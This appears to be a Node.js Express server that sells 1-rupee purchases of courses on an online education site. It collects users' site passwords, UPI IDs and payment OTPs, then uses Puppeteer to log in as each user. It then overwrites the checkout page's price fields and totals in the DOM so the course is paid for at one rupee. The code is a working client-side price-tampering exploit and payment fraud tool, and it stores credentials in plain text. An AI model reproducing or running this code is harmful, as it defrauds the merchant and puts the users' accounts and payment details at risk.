require("dotenv").config();
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;
const path = require("path");
const cors = require("cors");
const fs = require("fs");
const cookieParser = require("cookie-parser");
const axios = require("axios");
const User = require("./models/user.js");
const Unique = require("./models/unique.js");
const Track = require("./models/track.js");

// Cors
const corsOptions = {
  origin: process.env.ALLOWED_CLIENTS.split(","),
};

app.use(cors(corsOptions));
app.use(express.static("public"));

app.use(express.urlencoded({ extended: false }));

const connectDB = require("./config/db");
connectDB();

app.use(express.json());
app.use(cookieParser());

app.set("views", path.join(__dirname, "/views"));
app.set("view engine", "ejs");

async function waitFor20Sec() {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      resolve("done");
    }, 1500);
  });
}

app.get("/", (req, res) => {
  const ip = req.ip;
  console.log("new req || ip = ", ip);
  res.render("homepage");
});
app.post("/user", async (req, res) => {
  const { mobileNumber, utkPass, email, upiId } = req.body;

  // let allUsers = await fs.promises.readFile("./users.json", "utf-8");
  // allUsers = JSON.parse(allUsers);
  // const id = allUsers.length + 1;

  const user = new User({
    mobileNumber: mobileNumber,
    utkPass: utkPass,
    email: email,
    // id: id,
    upiId: upiId,
  });
  const response = await user.save();

  // let newUser = {
  //   mobileNumber,
  //   utkPass,
  //   email,
  //   id,
  //   upiId,
  //   paymentTimes: 0,
  //   puchaseTimes: 0,
  // };

  // allUsers.push(newUser);

  // await fs.promises.writeFile("./users.json", JSON.stringify(allUsers));

  return res.redirect("https://topmate.io/levitt/1641093");
});
app.get("/paymentpage", async (req, res) => {
  return res.send(
    "<a href='/getcoursedetails'>getcoursedetails</getcoursedetails>"
  );
});
app.get("/getcoursedetails", async (req, res) => {
  const referer = req.get("referer");
  console.log(referer);

  if (!referer) {
    return res.send(
      "<h1>Some Error Happened Please Contact Us On This Telegram <a href='https://t.me/sunilkumar_utk'>@sunilkumar_utk</a> And Must Send Your Payment Mobile Number</h1>"
    );
  }

  if (referer.includes("topmate.io")) {
    const unique = new Unique({
      uniqueId: Date.now(),
    });
    const response = await unique.save();

    return res.cookie("payment", response.uniqueId).render("getcoursedetails");
  } else {
    return res.send(
      "<h1>Some Error Happened Please Contact Us On This Telegram <a href='https://t.me/sunilkumar_utk'>@sunilkumar_utk</a></h1>"
    );
  }
});
app.post("/purchasecourse", async (req, res) => {
  const referer = req.get("referer");
  console.log(referer);
  if (!referer) {
    return res.send(
      "<h1>Some Error Happened Please Contact Us On This Telegram <a href='https://t.me/sunilkumar_utk'>@sunilkumar_utk</a> And Must Send Your Payment Mobile Number</h1>"
    );
  }

  //chech if refrer includes payment url
  if (referer.includes("getcoursedetails")) {
    console.log(req.cookies.payment);

    if (!req.cookies.payment) {
      return res.send(
        "<h1>Some Error Happened Please Contact Us On This Telegram <a href='https://t.me/sunilkumar_utk'>@sunilkumar_utk</a></h1>"
      );
    }

    const isPaymentDone = await Unique.findOne({
      uniqueId: req.cookies.payment,
    });

    if (isPaymentDone) {
      const { mobileNumber, courseUrl } = req.body;

      const user = await User.findOne({ mobileNumber: mobileNumber });

      // let allUsers = await fs.promises.readFile("./users.json", "utf-8");
      // allUsers = JSON.parse(allUsers);

      // const user = allUsers.find((user) => user.mobileNumber == mobileNumber);
      if (user) {
        const usertrack = await Track.findOne({ mNumber: mobileNumber });
        if (usertrack) {
          await Track.findOneAndUpdate(
            { mNumber: mobileNumber },
            { paymentStatus: 0 }
          );
        } else {
          //trackFile.push({ mNumber: mobileNumber, paymentStatus: 0 });
          const track = new Track({
            mNumber: mobileNumber,
            paymentStatus: 0,
            message: "Messages Will Show Here",
          });
          const response = await track.save();
          console.log(response);
        }

        //call purchase Function
        purchaseCourseViaPuppeteer(
          courseUrl,
          user.mobileNumber,
          user.utkPass,
          user.upiId
        );
        // test(mobileNumber)
        //call purchase Function

        // return res.send(
        //   `Payment Done Now Purchasing course <a href='/track?mNumber=${mobileNumber}'>Click Here</a> To Track The Progress.`
        // );

        return res.send(
          `<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-LN+7fdVzj6u52u30Kp6M/trliBMCMKTyK833zpbD+pXdCLuTusPj697FH4R/5mcr"
      crossorigin="anonymous"
    />
  </head>
  <body>
    <div class="container">
            <h3 class="mt-3">तक़रीबन 3 मिनट बाद आपके पास 1 रुपये की पेमेंट की रिक्वेस्ट आएगी तो उसका OTP यहाँ दर्ज करे</h3>
      <form action="/otp" method="post">
        <div class="mb-3">
        
          <label for="exampleInputEmail1" class="form-label"
            >Enter Otp</label
          >
          <input
            class="form-control"
            type="text"
            name="otp"
            placeholder="Enter otp"
            required
          />
        </div>

          <input
          hidden
            class="form-control"
            type="text"
            name="mobileNumber"
            value = "${mobileNumber}"
          />
        <button type="submit" class="btn btn-primary">Submit</button>
      </form>
    </div>

    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-ndDqU0Gzau9qJ1lfW4pNLlhNTkCfHzAVBReH9diLvGRem5+R9g2FzA8ZGN954O5Q"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
`
        );
      } else {
        return res.send("You Entered Wrong Mobile Number.");
      }
    } else {
      return res.send(
        "<h1>Some Error Happened Please Contact Us On This Telegram <a href='https://t.me/sunilkumar_utk'>@sunilkumar_utk</a></h1>"
      );
    }
  }

  //now purchase the course
});
app.post("/otp", async (req, res) => {
  const { otp, mobileNumber } = req.body;
  await fs.promises.writeFile(`${mobileNumber}.txt`, otp);
  return res.send(
    `Payment Done Now Purchasing course <a href='/track?mNumber=${mobileNumber}'>Click Here</a> To Track The Progress.`
  );
});
app.get("/track", async (req, res) => {
  if (req.query.mNumber) {
    const user = await Track.findOne({ mNumber: mobileNumber });
    if (!user) {
      return res.send("Nothing Found.");
    }

    if (user.paymentStatus == 100) {
      return res.send("Your Course Purchased Successfully.");
    } else {
      return res.send(
        `Your Course Purchase Is In Progress ${user.paymentStatus}% completed.`
      );
    }
  } else {
    return res.send("Nothing Found.");
  }
});

app.listen(PORT, console.log(`Listening on port ${PORT}.`));

async function purchaseCourseViaPuppeteer(
  courseUrl,
  mobileNumber,
  utkPass,
  upiId
) {
  try {
    console.warn(courseUrl);
    console.warn(mobileNumber);
    console.warn(utkPass);
    console.warn(upiId);
    async function waitFor20Sec() {
      return new Promise((resolve, reject) => {
        setTimeout(() => {
          resolve("done");
        }, 15000);
      });
    }
    //puppeteer code start
    const puppeteer = require("puppeteer");

    const browser = await puppeteer.launch({
      headless: false,
      args: ["--use-fake-ui-for-media-stream"],
    });

    const context = browser.defaultBrowserContext();
    await context.overridePermissions(courseUrl, ["geolocation"]);

    const page = await browser.newPage();

    await page.setGeolocation({ latitude: 28.6139, longitude: 77.209 });
    await page.setExtraHTTPHeaders({
      "User-Agent": "1.0",
      "X-Custom": "123456",
    });

    await page.setViewport({ width: 375, height: 667 });

    // await page.goto("https://www.skupdates.xyz");
    await page.goto(courseUrl, { waitUntil: "networkidle2" });

    await waitFor20Sec();

    await page.waitForSelector("div.bottom-buy-section");

    await waitFor20Sec();

    // //writting on fs file
    // let trackFile = await fs.promises.readFile("./track.json","utf-8");
    // trackFile = JSON.parse(trackFile);
    // let updateUser = trackFile.find(user=>user.mNumber == mobileNumber);
    // updateUser.paymentStatus = 10
    // updateUser.message = "Course Page Opened Now Tring loging In";
    // await fs.promises.writeFile("./track.json",JSON.stringify(trackFile));
    // //writting on fs file

    await page.click(".bottom-buy-section .ms-auto  a");
    await waitFor20Sec();
    await page.click(".already_password_click");
    await waitFor20Sec();
    await page.type(
      ".form-group .input-group #login_with_pass_mobile",
      mobileNumber
    );
    await page.type(".form-group .input-group #login_password", utkPass);
    await page.click("#form  input[type='submit']");

    await waitFor20Sec();

    const isLoggedIn = await page.$("div.profile");

    if (isLoggedIn) {
      console.log("logged In Successfully");

      // //writting on fs file
      // let trackFile = await fs.promises.readFile("./track.json","utf-8");
      // trackFile = JSON.parse(trackFile);
      // let updateUser = trackFile.find(user=>user.mNumber == mobileNumber);
      // updateUser.paymentStatus = 30
      // updateUser.message = "Loging In Successfully Now Adding Course";
      // await fs.promises.writeFile("./track.json",JSON.stringify(trackFile));
      // //writting on fs file
    } else {
      console.log("incorrect pass.");

      //  //writting on fs file
      //   let trackFile = await fs.promises.readFile("./track.json","utf-8");
      //   trackFile = JSON.parse(trackFile);
      //   let updateUser = trackFile.find(user=>user.mNumber == mobileNumber);
      //   updateUser.paymentStatus = 30
      //   updateUser.message = "Your Entered Password Was Wrong";
      //   await fs.promises.writeFile("./track.json",JSON.stringify(trackFile));
      //   //writting on fs file
    }

    // const utkHtml = await fs.promises.readFile("./test.html","utf-8")
    // page.setContent(utkHtml)

    const waitRes = await waitFor20Sec();

    const main_price_package = await page.$eval(
      "input[id='main_price_package']",
      (el) => el.value
    );

    let update_price = await page.$eval(
      "input[id='update_price']",
      (el) => el.value
    );

    const total_result_sub_val = await page.$eval(
      "input[id='total_result_sub_val']",
      (el) => el.value
    );

    const total_result_sub = await page.$eval(
      "h4#total_result_sub span",
      (el) => el.value
    );

    console.log(main_price_package);

    await page.evaluate(() => {
      let main_price_package = document.querySelector(
        "input[id='main_price_package']"
      );
      if (main_price_package) {
        main_price_package.value = 1;
      }
    });

    await page.evaluate(() => {
      let total_result_sub = document.querySelector(
        "h4#total_result_sub > span"
      );
      if (total_result_sub) {
        total_result_sub.textContent = 1;
      }
    });

    await page.evaluate(() => {
      let update_prices_with_notes = document.querySelector(
        "h4#total_result > span.update_prices_with_notes"
      );
      if (update_prices_with_notes) {
        update_prices_with_notes.textContent = 1;
      }
    });

    await page.evaluate(async () => {
      let update_price = document.querySelector("input[id='update_price']");
      console.log(update_price);
      if (update_price) {
        update_price.value =
          Number(document.querySelector("input[id='update_price']").value) +
          Number(
            document.querySelector("input[id='total_result_sub_val']").value
          ) -
          1;
      }
    });

    await page.evaluate(async () => {
      let update_price = document.querySelector("h4.update_price");
      console.log(update_price);
      if (update_price) {
        update_price.textContent =
          "- ₹ " +
          Number(document.querySelector("input[id='update_price']").value);
      }
    });

    await page.evaluate(() => {
      let total_result_sub_val = document.querySelector(
        "input[id='total_result_sub_val']"
      );
      if (total_result_sub_val) {
        total_result_sub_val.value = 1;
      }
    });

    await page.evaluate(async () => {
      let priceaddon = document.querySelector("input[id='priceaddon']");
      console.log(priceaddon);
      if (priceaddon) {
        priceaddon.value = 1;
      }
    });

    await page.evaluate(async () => {
      let mainprice = document.querySelector("input[id='mainprice']");
      console.log(mainprice);
      if (mainprice) {
        mainprice.value = 1;
      }
    });

    await page.click("div.paymentBtn  button[type='button']");

    await waitFor20Sec();

    await waitFor20Sec();
    await waitFor20Sec();

    //enter inside the iframe
    const elementHandle = await page.$("#boltFrame");
    const frame = await elementHandle.contentFrame();
    frame.waitForSelector("ul.all-payment-options-wrapper li:nth-child(4)");
    await frame.click("ul.all-payment-options-wrapper li:nth-child(4)");
    await waitFor20Sec();
    await waitFor20Sec();
    await frame.click(
      "div.boxedPaymentOptions ul.pymtns-type-accordian div.listItemContainer:nth-child(1) li"
    );

    await waitFor20Sec();

    await frame.type("#upi2Id", upiId);

    await waitFor20Sec();
    await waitFor20Sec();

    await frame.click("button#upi-verify-enabled");

    await waitFor20Sec();

    const iswrongUpi = await frame.$("span#upi2IdError");

    if (iswrongUpi) {
      console.log("Upi Is Wrong.");

      // //writting on fs file
      // let trackFile = await fs.promises.readFile("./track.json","utf-8");
      // trackFile = JSON.parse(trackFile);
      // let updateUser = trackFile.find(user=>user.mNumber == mobileNumber);
      // updateUser.paymentStatus = 80
      // updateUser.message = "Your Entered UPI Id Was Wrong";
      // await fs.promises.writeFile("./track.json",JSON.stringify(trackFile));
      // //writting on fs file
    }

    const finalUrl = await page.url();
    console.log(finalUrl);
    if (finalUrl.includes("success")) {
      console.log("payment successfully");
    }
    if (finalUrl.includes("failure")) {
      console.log("payment failed.");
    }
    //enter inside the iframe

    //   }
    // });

    console.warn(waitRes);

    await page.screenshot({ path: "frameimage.png" });

    await page.screenshot({ path: "image.png" });

    console.log("scree shot saved.");

    await browser.close();
  } catch (error) {
    console.log(error);
    // await browser.close();
    purchaseCourseViaPuppeteer(courseUrl, mobileNumber, utkPass, upiId);
  }
}

// async function test(mobileNumber){

//     for (let index = 0; index < 100; index++) {
//           //writting on fs file
//         let trackFile = await fs.promises.readFile("./track.json","utf-8");
//   trackFile = JSON.parse(trackFile);
//   let updateUser = trackFile.find(user=>user.mNumber == mobileNumber);
//   updateUser.paymentStatus = index
//   updateUser.message = "Loging In Successfully Now Adding Course";
//   await fs.promises.writeFile("./track.json",JSON.stringify(trackFile));
//   //writting on fs file

//   await waitFor20Sec()
//     }

// }
